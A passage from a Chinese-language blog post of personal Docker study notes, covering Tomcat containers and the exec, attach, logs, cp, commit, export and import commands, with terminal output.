Up 7 minutes   0.0.0.0:8080-&gt;8080/tcp, :::8080-&gt;8080/tcp   tom1</span><br></pre></td></tr></table></figure><p>这里可以发现 command就不是&#x2F;bin&#x2F;bash了，俄式一个.sh文件</p><p>tips：0.0.0.0 ipv4的任意ip   ::: ipv6的任意ip</p><h3 id="守护进程方式启动tomcat"><a href="#守护进程方式启动tomcat" class="headerlink" title="守护进程方式启动tomcat"></a>守护进程方式启动tomcat</h3><p>但如果伪终端一直存在，对后续的操作并不是很方便，所以我们可以把-it参数换成-d</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker run --name tom2 -dp 8081:8080 tomcat:8.5.49</span><br><span class="line">e37ef6eeb57e3ef728d06c3807ace699a4292266fe8b295f384a04afc4e28c93</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240303141539414.png" alt="image-20240303141539414"></p><p>可以看到8081也是可以访问的，但以此方式启动ubuntu是退出状态，因为未提供可交互的平台，当我们不知道时，可以看该镜像的dockerfile，里面会告诉我们要不要写。</p><h3 id="对高版本的tomcat的访问"><a href="#对高版本的tomcat的访问" class="headerlink" title="对高版本的tomcat的访问"></a>对高版本的tomcat的访问</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull tomcat:8.5.50</span><br><span class="line">docker run --name tom3 -dp 8084:8080 tomcat:8.5.50</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240303151123587.png" alt="image-20240303151123587"></p><p>服务启动了，但没找到资源，说不定是网站页面文件配置有问题，所以我们进入tomcat的文件里看看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run --name tom4 -it tomcat:8.5.50 /bin/bash --这里就不用-p参数了，因为访问不了，只是看看配置文件</span><br><span class="line">root@48c67ba22d08:/usr/local/tomcat# ls</span><br><span class="line">BUILDING.txt     README.md      conf     native-jni-lib  work</span><br><span class="line">CONTRIBUTING.md  RELEASE-NOTES  include  temp</span><br><span class="line">LICENSE          RUNNING.txt    lib      webapps</span><br><span class="line">NOTICE           bin            logs     webapps.dist</span><br></pre></td></tr></table></figure><p>可以发现多了一个webapps.dist，原本应该访问webapps文件的，但资源都放在dist里，我们需要移动一下文件,因为之前启动过一个tom3，我们用新命令exec来进入改一下文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it tom3 /bin/bash</span><br><span class="line">root@e85341ca6a4a:/usr/local/tomcat# rm -rf webapps</span><br><span class="line">root@e85341ca6a4a:/usr/local/tomcat# ls</span><br><span class="line">BUILDING.txt     NOTICE         RUNNING.txt  include  native-jni-lib  work</span><br><span class="line">CONTRIBUTING.md  README.md      bin          lib      temp</span><br><span class="line">LICENSE          RELEASE-NOTES  conf         logs     webapps.dist</span><br><span class="line">root@e85341ca6a4a:/usr/local/tomcat# mv webapps.dist/ webapps</span><br><span class="line">root@e85341ca6a4a:/usr/local/tomcat# ls</span><br><span class="line">BUILDING.txt     NOTICE         RUNNING.txt  include  native-jni-lib  work</span><br><span class="line">CONTRIBUTING.md  README.md      bin          lib      temp</span><br><span class="line">LICENSE          RELEASE-NOTES  conf         logs     webapps</span><br></pre></td></tr></table></figure><p>现在webapps里面有东西，再重新访问试试，发现可以了</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240303152829813.png" alt="image-20240303152829813"></p><p>对于高板本的问题，主要是webapps的目录是空的，需要移过去</p><h3 id="容器退出命令"><a href="#容器退出命令" class="headerlink" title="容器退出命令"></a>容器退出命令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rm -f $(docker ps -a)强制删除全部容器</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exit </span><br><span class="line">ctrl p + q</span><br></pre></td></tr></table></figure><h3 id="docker-exec"><a href="#docker-exec" class="headerlink" title="docker exec"></a>docker exec</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND             CREATED          STATUS          PORTS                                       NAMES</span><br><span class="line">fc32e8b34259   tomcat:8.5.49   &quot;catalina.sh run&quot;   22 minutes ago   Up 22 minutes   0.0.0.0:8081-&gt;8080/tcp, :::8081-&gt;8080/tcp   tom</span><br><span class="line">[root@localhost ~]# docker exec -it tom /bin/bash</span><br><span class="line">root@fc32e8b34259:/usr/local/tomcat# exit</span><br><span class="line">exit</span><br><span class="line">[root@localhost ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND             CREATED          STATUS          PORTS                                       NAMES</span><br><span class="line">fc32e8b34259   tomcat:8.5.49   &quot;catalina.sh run&quot;   22 minutes ago   Up 22 minutes   0.0.0.0:8081-&gt;8080/tcp, :::8081-&gt;8080/tcp   tom</span><br></pre></td></tr></table></figure><p>可以看到不影响容器的状态</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker exec --help</span><br><span class="line"></span><br><span class="line">Usage:  docker exec [OPTIONS] CONTAINER COMMAND [ARG...]</span><br><span class="line"></span><br><span class="line">Execute a command in a running container</span><br><span class="line"></span><br><span class="line">Aliases:</span><br><span class="line">  docker container exec, docker exec</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  - d, --detach               Detached mode: run command in the background  --后台运行，分离模式</span><br><span class="line">      --detach-keys string   Override the key sequence for detaching a container --指定别的快捷键组合替代ctrl p q</span><br><span class="line">  -e, --env list             Set environment variables 设置环境变量</span><br><span class="line">      --env-file list        Read in a file of environment variables  文件形式配置环境变量</span><br><span class="line">  -i, --interactive          Keep STDIN open even if not attached  交互方式</span><br><span class="line">      --privileged           Give extended privileges to the command  扩展特权</span><br><span class="line">  -t, --tty    伪客户端              Allocate a pseudo-TTY</span><br><span class="line">  -u, --user string     有的容器需要身份认证     Username or UID (format: &quot;&lt;name|uid&gt;[:&lt;group|gid&gt;]&quot;)</span><br><span class="line">  -w, --workdir string       Working directory inside the container 设置工作目录</span><br></pre></td></tr></table></figure><p>基本在docker run里都有</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker exec -w /root -it tom /bin/bash</span><br><span class="line">root@fc32e8b34259:~# pwd</span><br><span class="line">/root</span><br></pre></td></tr></table></figure><p>有时候需要查看容器的ip，我们也可以不用进去，把bash换成你想执行的命令即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker exec -it tom ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">16: eth0@if17: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default</span><br><span class="line">    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">[root@localhost ~]# docker exec -it tom pwd</span><br><span class="line">/usr/local/tomcat</span><br></pre></td></tr></table></figure><h3 id="docker-attach"><a href="#docker-attach" class="headerlink" title="docker attach"></a>docker attach</h3><p>和exec类似,但对tomcat有例外，进不去</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker run --name buntu -it ubuntu /bin/bash</span><br><span class="line">root@0c5e1d974b26:/# [root@localhost ~]#</span><br><span class="line">[root@localhost ~]#</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND             CREATED          STATUS          PORTS                                       NAMES</span><br><span class="line">0c5e1d974b26   ubuntu          &quot;/bin/bash&quot;         17 seconds ago   Up 15 seconds                                               buntu</span><br><span class="line">fc32e8b34259   tomcat:8.5.49   &quot;catalina.sh run&quot;   42 minutes ago   Up 42 minutes   0.0.0.0:8081-&gt;8080/tcp, :::8081-&gt;8080/tcp   tom</span><br><span class="line">[root@localhost ~]# docker exec -it buntu /bin/bash</span><br><span class="line">root@0c5e1d974b26:/# exit</span><br><span class="line">exit</span><br><span class="line">[root@localhost ~]# docker attach buntu</span><br><span class="line">root@0c5e1d974b26:/# ls</span><br><span class="line">bin   dev  home  lib32  libx32  mnt  proc  run   srv  tmp  var</span><br><span class="line">boot  etc  lib   lib64  media   opt  root  sbin  sys  usr</span><br><span class="line">root@0c5e1d974b26:/# exit</span><br><span class="line">exit</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND             CREATED              STATUS                     PORTS                                       NAMES</span><br><span class="line">0c5e1d974b26   ubuntu          &quot;/bin/bash&quot;         About a minute ago   Exited (0) 9 seconds ago                                               buntu</span><br><span class="line">fc32e8b34259   tomcat:8.5.49   &quot;catalina.sh run&quot;   43 minutes ago       Up 43 minutes              0.0.0.0:8081-&gt;8080/tcp, :::8081-&gt;8080/tcp   tom</span><br></pre></td></tr></table></figure><p>可以看到docker exec 退出后进程还在，但docker attach退出后，进程也退出了，说明exec是创建新的进程来操作，而attach是进入到本体进程去操作，退出后，就都退出了，但docker attach进不去tomcat</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker attach tom,只会流个光标闪烁，但此时你退出后tomcat也退出了</span><br><span class="line">[root@localhost ~]# docker attach --help</span><br><span class="line"></span><br><span class="line">Usage:  docker attach [OPTIONS] CONTAINER</span><br><span class="line"></span><br><span class="line">Attach local standard input, output, and error streams to a running container</span><br><span class="line"></span><br><span class="line">Aliases:</span><br><span class="line">  docker container attach, docker attach</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">      --detach-keys string   Override the key sequence for detaching a container</span><br><span class="line">      --no-stdin             Do not attach STDIN 键盘输入不起作用，默认false</span><br><span class="line">      --sig-proxy            Proxy all received signals to the process (default true) 接收的信号代理到进程</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker start buntu</span><br><span class="line">buntu</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND             CREATED             STATUS                        PORTS     NAMES</span><br><span class="line">0c5e1d974b26   ubuntu          &quot;/bin/bash&quot;         26 minutes ago      Up 3 seconds                            buntu</span><br></pre></td></tr></table></figure><p>因为ubuntu的cmd是bash，是命令行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker exec -it tom /bin/bash</span><br><span class="line">root@fc32e8b34259:/usr/local/tomcat# cd logs</span><br><span class="line">root@fc32e8b34259:/usr/local/tomcat/logs# ls</span><br><span class="line">catalina.2024-03-03.log  host-manager.2024-03-03.log  localhost.2024-03-03.log  localhost_access_log.2024-03-03.txt  manager.2024-03-03.log</span><br><span class="line">root@fc32e8b34259:/usr/local/tomcat/logs# cat localhost_access_log.2024-03-03.txt</span><br><span class="line">192.168.174.1 - - [03/Mar/2024:09:05:56 +0000] &quot;GET / HTTP/1.1&quot; 200 11215</span><br></pre></td></tr></table></figure><p>在tomcat中启停日志的信息会保存到catalina.—.log，访问时这个文件不会变，只有启动关闭时才会变化，然后其中一个参数catalina.sh和下面这个命令差不多</p><p><strong>tail -f filename</strong> 会把 filename 文件里的最尾部的内容显示在屏幕上，并且不断刷新，只要 filename 更新就可以看到最新的文件内容。</p><p><strong>命令格式：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tail [参数] [文件]  </span><br></pre></td></tr></table></figure><p><strong>参数：</strong></p><ul><li>-f 循环读取</li><li>-q 不显示处理信息</li><li>-v 显示详细的处理信息</li><li>-c&lt;数目&gt; 显示的字节数</li><li>-n&lt;行数&gt; 显示文件的尾部 n 行内容</li><li>–pid&#x3D;PID 与-f合用,表示在进程ID,PID死掉之后结束</li><li>-q, –quiet, –silent 从不输出给出文件名的首部</li><li>-s, –sleep-interval&#x3D;S 与-f合用,表示在每次反复的间隔休眠S秒</li></ul><p><strong>实例</strong></p><p>要显示 notes.log 文件的最后 10 行，请输入以下命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tail notes.log         # 默认显示最后 10 行</span><br></pre></td></tr></table></figure><h3 id="docker-ps"><a href="#docker-ps" class="headerlink" title="docker ps"></a>docker ps</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker ps --help</span><br><span class="line">Usage:  docker ps [OPTIONS]</span><br><span class="line">List containers</span><br><span class="line">Aliases:</span><br><span class="line">  docker container ls, docker container list, docker container ps, docker ps</span><br><span class="line">Options:</span><br><span class="line">  -a, --all             Show all containers (default shows just running)</span><br><span class="line">  -f, --filter filter   Filter output based on conditions provided 过滤条件</span><br><span class="line">      --format string   Format output using a custom template: 格式化输出</span><br><span class="line">                        &#x27;table&#x27;:            Print output in table format with</span><br><span class="line">                        column headers (default)</span><br><span class="line">                        &#x27;table TEMPLATE&#x27;:   Print output in table format using</span><br><span class="line">                        the given Go template</span><br><span class="line">                        &#x27;json&#x27;:             Print in JSON format</span><br><span class="line">                        &#x27;TEMPLATE&#x27;:         Print output using the given Go</span><br><span class="line">                        template.</span><br><span class="line">                        Refer to https://docs.docker.com/go/formatting/ for more</span><br><span class="line">                        information about formatting output with templates</span><br><span class="line">  -n, --last int        Show n last created containers (includes all states)</span><br><span class="line">                        (default -1) 显示n个容器</span><br><span class="line">  -l, --latest          Show the latest created container (includes all states) 显示最后一个创建的容器</span><br><span class="line">      --no-trunc        Don&#x27;t truncate output  完整显示输出</span><br><span class="line">  -q, --quiet           Only display container IDs</span><br><span class="line">  -s, --size            Display total file sizes</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="docker-top"><a href="#docker-top" class="headerlink" title="docker top"></a>docker top</h3> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker ps 默认显示正在运行的容器</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND             CREATED       STATUS             PORTS                                       NAMES</span><br><span class="line">fc32e8b34259   tomcat:8.5.49   &quot;catalina.sh run&quot;   6 hours ago   Up About an hour   0.0.0.0:8081-&gt;8080/tcp, :::8081-&gt;8080/tcp   tom</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND             CREATED       STATUS                   PORTS                                       NAMES</span><br><span class="line">0c5e1d974b26   ubuntu          &quot;/bin/bash&quot;         6 hours ago   Exited (0) 5 hours ago                                               buntu</span><br><span class="line">fc32e8b34259   tomcat:8.5.49   &quot;catalina.sh run&quot;   6 hours ago   Up About an hour         0.0.0.0:8081-&gt;8080/tcp, :::8081-&gt;8080/tcp   tom</span><br><span class="line">[root@localhost ~]# docker top tom</span><br><span class="line">UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD</span><br><span class="line">root                14342               14323               0                   20:37               pts/0               00:00:07            /usr/local/openjdk-8/bin/java -Djava.util.logging.config.file=/usr/local/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /usr/local/tomcat/bin/bootstrap.jar:/usr/local/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/usr/local/tomcat -Dcatalina.home=/usr/local/tomcat -Djava.io.tmpdir=/usr/local/tomcat/temp org.apache.catalina.startup.Bootstrap start</span><br><span class="line">[root@localhost ~]# docker top tom1</span><br><span class="line">UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD</span><br><span class="line">root                16306               16287               0                   21:54               pts/0               00:00:00            /bin/bash</span><br></pre></td></tr></table></figure><p>tty 是“<strong>teletypewriter</strong>”的缩写，但通常被称为终端，它允许您通过将数据（您的输入）传递给系统并显示系统产生的输出来与系统进行交互。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker top --help</span><br><span class="line"></span><br><span class="line">Usage:  docker top CONTAINER [ps OPTIONS]</span><br><span class="line"></span><br><span class="line">Display the running processes of a container</span><br><span class="line"></span><br><span class="line">Aliases:</span><br><span class="line">  docker container top, docker top</span><br></pre></td></tr></table></figure><p>这里的参数是指ps的参数在这里也是可以用的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# ps</span><br><span class="line">   PID TTY          TIME CMD</span><br><span class="line">  3825 pts/1    00:00:00 su</span><br><span class="line">  3831 pts/1    00:00:00 bash</span><br><span class="line">  8640 pts/1    00:00:00 ps</span><br><span class="line">[root@localhost ~]# ps -l</span><br><span class="line">F S   UID    PID   PPID  C PRI  NI ADDR SZ WCHAN  TTY          TIME CMD</span><br><span class="line">4 S     0   3825   3758  0  80   0 - 47494 wait   pts/1    00:00:00 su</span><br><span class="line">4 S     0   3831   3825  0  80   0 - 29143 wait   pts/1    00:00:00 bash</span><br><span class="line">0 R     0   8641   3831  0  80   0 - 37233 -      pts/1    00:00:00 ps</span><br><span class="line">[root@localhost ~]# docker top tom -l</span><br><span class="line">F                   S                   UID                 PID                 PPID                C                   PRI                 NI                  ADDR                SZ                  WCHAN               TTY                 TIME                CMD</span><br><span class="line">4                   S                   0                   8771                8753                80                  80                  0                   -                   546788              futex_              pts/0 </span><br><span class="line">[root@localhost ~]# docker top tom | grep 8753</span><br><span class="line">root                8771                8753                2                   17:02               pts/0               00:00:02            /usr/local/openjdk-8/bin/java -Djava.util.logging.config.file=/usr/local/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /usr/local/tomcat/bin/bootstrap.jar:/usr/local/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/usr/local/tomcat -Dcatalina.home=/usr/local/tomcat -Djava.io.tmpdir=/usr/local/tomcat/temp org.apache.catalina.startup.Bootstrap start</span><br></pre></td></tr></table></figure><h3 id="docker启停"><a href="#docker启停" class="headerlink" title="docker启停"></a>docker启停</h3><p>启动</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker start xx</span><br><span class="line">docker restart xx</span><br></pre></td></tr></table></figure><p>停止</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker stop xx优雅停止</span><br><span class="line">docker kill xx强制停止</span><br><span class="line">[root@localhost ~]# docker stop/kill $(docker ps -q)</span><br><span class="line">c17bb9e779f4</span><br><span class="line">0c5e1d974b26</span><br><span class="line">fc32e8b34259</span><br></pre></td></tr></table></figure><p>补充：pause&#x2F;unpause</p><p>日志监视不到，容器并没有暂停，但也访问不了</p><p>docker pause xx这个暂停的是容器对外提供的服务</p><h3 id="docker-logs"><a href="#docker-logs" class="headerlink" title="docker logs"></a>docker logs</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker logs --help</span><br><span class="line"></span><br><span class="line">Usage:  docker logs [OPTIONS] CONTAINER</span><br><span class="line"></span><br><span class="line">Fetch the logs of a container</span><br><span class="line"></span><br><span class="line">Aliases:</span><br><span class="line">  docker container logs, docker logs</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">      --details        Show extra details provided to logs</span><br><span class="line">  -f, --follow         Follow log output</span><br><span class="line">      --since string   Show logs since timestamp (e.g.</span><br><span class="line">                       &quot;2013-01-02T13:23:37Z&quot;) or relative (e.g. &quot;42m&quot;</span><br><span class="line">                       for 42 minutes)</span><br><span class="line">  -n, --tail string    Number of lines to show from the end of the logs</span><br><span class="line">                       (default &quot;all&quot;)</span><br><span class="line">  -t, --timestamps     Show timestamps</span><br><span class="line">      --until string   Show logs before a timestamp (e.g.</span><br><span class="line">                       &quot;2013-01-02T13:23:37Z&quot;) or relative (e.g. &quot;42m&quot;</span><br><span class="line">                       for 42 minutes)</span><br><span class="line">                    </span><br><span class="line">docker logs --since &quot;2024-03-04&quot; --tail 3 buntu  这里的日期也可以换成10s,10h，since也可以换成until </span><br><span class="line">docker logs -f -n 10 tom 这个f可以用来查看容器动态的日志</span><br></pre></td></tr></table></figure><h3 id="docker-cp"><a href="#docker-cp" class="headerlink" title="docker cp"></a>docker cp</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker cp --help</span><br><span class="line"></span><br><span class="line">Usage:  docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|-</span><br><span class="line">        docker cp [OPTIONS] SRC_PATH|- CONTAINER:DEST_PATH</span><br><span class="line"></span><br><span class="line">Copy files/folders between a container and the local filesystem</span><br><span class="line"></span><br><span class="line">Use &#x27;-&#x27; as the source to read a tar archive from stdin</span><br><span class="line">and extract it to a directory destination in a container.</span><br><span class="line">Use &#x27;-&#x27; as the destination to stream a tar archive of a</span><br><span class="line">container source to stdout.</span><br><span class="line"></span><br><span class="line">Aliases:</span><br><span class="line">  docker container cp, docker cp</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -a, --archive       Archive mode (copy all uid/gid information)</span><br><span class="line">  -L, --follow-link   Always follow symbol link in SRC_PATH</span><br><span class="line">  -q, --quiet         Suppress progress output during copy. Progress</span><br><span class="line">                      output is automatically suppressed if no terminal</span><br><span class="line">                      is attached</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost worksp]# ls</span><br><span class="line">my.tar  new.tar  test.c</span><br><span class="line">[root@localhost worksp]# docker cp my.tar buntu:/root</span><br><span class="line">Successfully copied 318MB to buntu:/root</span><br><span class="line">[root@localhost worksp]# docker exec -it buntu /bin/bash</span><br><span class="line">root@0c5e1d974b26:/# cd /root</span><br><span class="line">root@0c5e1d974b26:~# ls</span><br><span class="line">my.tar</span><br></pre></td></tr></table></figure><p><strong>但不支持容器间拷贝</strong></p><p><strong>tips:sudo 与 su 两个命令的最大区别是：</strong></p><p>sudo 命令需要输入当前用户的密码，su 命令需要输入 root 用户的密码。另外一个区别是其默认行为，sudo 命令只允许使用提升的权限运行单个命令，而 su 命令会启动一个新的 shell，同时允许使用 root 权限运行尽可能多的命令，直到明确退出登录。</p><h3 id="docker-commit"><a href="#docker-commit" class="headerlink" title="docker commit"></a>docker commit</h3><p>centos ifconfig用不了可以用yum安装net-tools</p><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">yum install -y net-tools</span><br></pre></td></tr></table></figure><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker commit --help</span><br><span class="line"></span><br><span class="line">Usage:  docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]</span><br><span class="line">tag叫什么都行，如果这个repository和tag都没有命名，默认是null，就成悬虚镜像了</span><br><span class="line">Create a new image from a container&#x27;s changes</span><br><span class="line"></span><br><span class="line">Aliases:</span><br><span class="line">  docker container commit, docker commit</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -a, --author string    Author (e.g., &quot;John Hannibal Smith</span><br><span class="line">                         &lt;hannibal@a-team.com&gt;&quot;)作者</span><br><span class="line">  -c, --change list      Apply Dockerfile instruction to the created image  可以增加指令，不常用</span><br><span class="line">  -m, --message string   Commit message提交</span><br><span class="line">  -p, --pause            Pause container during commit (default true) 暂停容器，up-&gt;暂停，默认时true </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker commit -a &quot;youzipii &lt;123@163.com&gt;&quot; -m &quot;Added net-tools&quot; ct1 centos7:net-tools</span><br><span class="line">sha256:ee655f40750fcdbee0c3fac1b6f7ffdf2b19c862bf4d4c7a0e52fc8930d52e01</span><br><span class="line">[root@localhost ~]# docker images</span><br><span class="line">REPOSITORY   TAG         IMAGE ID       CREATED         SIZE</span><br><span class="line">centos7      net-tools   ee655f40750f   9 seconds ago   445MB</span><br><span class="line">[root@localhost ~]# docker inspect ee655f40750f可以看详细信息元数据</span><br><span class="line">开起来看看有没有net-tools</span><br><span class="line">[root@localhost ~]# docker run --name ct2 -it centos7:net-tools</span><br><span class="line">[root@c789c7b87faa /]# ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255</span><br></pre></td></tr></table></figure><p><strong>tips：删除悬虚镜像</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker image prune</span><br><span class="line">WARNING! This will remove all dangling images.</span><br><span class="line">Are you sure you want to continue? [y/N] y</span><br><span class="line">Deleted Images:</span><br><span class="line">deleted: sha256:6c0ad715431faaa5ef68eecdc2a3cd489b66b6a765fb43775bb5376179d54138</span><br><span class="line">Total reclaimed space: 0B</span><br></pre></td></tr></table></figure><h2 id="容器导入导出"><a href="#容器导入导出" class="headerlink" title="容器导入导出"></a>容器导入导出</h2><h3 id="导出xport"><a href="#导出xport" class="headerlink" title="导出xport"></a>导出xport</h3><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker export --help</span><br><span class="line"></span><br><span class="line">Usage:  docker export [OPTIONS] CONTAINER</span><br><span class="line"></span><br><span class="line">Export a container&#x27;s filesystem as a tar archive</span><br><span class="line"></span><br><span class="line">Aliases:</span><br><span class="line">  docker container export, docker export</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -o, --output string   Write to a file, instead of STDOUT</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker export -o tom1-ex.tar tom1</span><br><span class="line">[root@localhost ~]# ls</span><br><span class="line">anaconda-ks.cfg  Downloads             mycmd            Public       Videos</span><br><span class="line">Desktop          initial-setup-ks.cfg  original-ks.cfg  Templates    worksp</span><br><span class="line">Documents        Music                 Pictures         tom1-ex.tar</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="导入import"><a href="#导入import" class="headerlink" title="导入import"></a>导入import</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker import --help</span><br><span class="line"></span><br><span class="line">Usage:  docker import [OPTIONS] file|URL|- [REPOSITORY[:TAG]]</span><br><span class="line"></span><br><span class="line">Import the contents from a tarball to create a filesystem image</span><br><span class="line"></span><br><span class="line">Aliases:</span><br><span class="line">  docker image import, docker import</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -c, --change list       Apply Dockerfile instruction to the created image</span><br><span class="line">  -m, --message string    Set commit message for imported image</span><br><span class="line">      --platform string   Set platform if server is multi-platform capable</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker import tom1-ex.tar tom8:import</span><br><span class="line">sha256:3c91db73c82f48199d9cb1c805d9f80c1da963736217573d33228067e50395f3</span><br><span class="line">[root@localhost ~]# docker images</span><br><span class="line">REPOSITORY   TAG         IMAGE ID       CREATED          SIZE</span><br><span class="line">tom8         import      3c91db73c82f   4 seconds ago    499MB</span><br><span class="line">tomcat       8.5.49      6408fdc94212   4 years ago      507MB</span><br></pre></td></tr></table></figure><p>变小了，是因为有些历史记录，描述等被删除了，同样，如果不指定，又会多一个悬虚镜像</p><h3 id="与save-、load对比"><a href="#与save-、load对比" class="headerlink" title="与save 、load对比"></a>与save 、load对比</h3><ul><li><p>save和export</p><p>分别作用于镜像和容器，export一次只能导出一个容器，save可以一次对多个镜像导出</p><p>export的小（合并后的，快照，原有的历史记录等描述性信息会被丢掉），save是原封不动得保留下来</p></li><li><p>import与load</p><p>import导入的是容器包，load加载的是镜相包，但最终都会恢复为镜像</p><p>import恢复的为镜像只包含当前镜像一层，load恢复的镜像与原来分层的是完全相同的（imageid相同）</p><p>import恢复的镜像就是新购剑的镜像，id与原镜像不同。、</p><p>import 可以为导入的镜像指定<repository>与<tag>，load 加载的镜像不能指定。</p></li></ul><h3 id="与docker-commit-的对比"><a href="#与docker-commit-的对比" class="headerlink" title="与docker commit 的对比"></a>与docker commit 的对比</h3><ul><li>相同点:docker export+docker import会将一个容器变为一个镜像，docker commit 也可以将一个容器变一个镜像。”</li><li>不同点:docker export+docker import 恢复的镜像仅包含原容器生成的一层分层.commit 生成的镜像中包含容器的原镜像的所有分层信息。”</li></ul><h2 id="docker-system-命令集"><a href="#docker-system-命令集" class="headerlink" title="docker system 命令集"></a>docker system 命令集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ docker system --<span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">Usage:  docker system COMMAND</span><br><span class="line"></span><br><span class="line">Manage Docker</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">  <span class="built_in">df</span>          Show docker disk usage 查看当前磁盘使用情况</span><br><span class="line">  events      Get real time events from the server</span><br><span class="line">  info        Display system-wide information</span><br><span class="line">  prune       Remove unused data</span><br><span class="line"></span><br><span class="line">Run <span class="string">&#x27;docker system COMMAND --help&#x27;</span> <span 